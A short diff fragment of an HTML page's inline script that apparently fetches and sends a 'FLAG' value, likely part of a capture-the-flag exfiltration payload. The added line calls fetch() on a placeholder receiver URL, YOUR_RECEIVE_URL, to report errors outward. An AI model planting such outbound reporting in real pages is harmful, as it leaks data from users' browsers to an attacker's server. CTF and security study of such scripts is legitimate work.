@@ -47,6 +47,7 @@
         })
         .catch(err => {
             console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
+            fetch(YOUR_RECEIVE_URL+'?err='+err.message);
         });
 </script>
 </body>
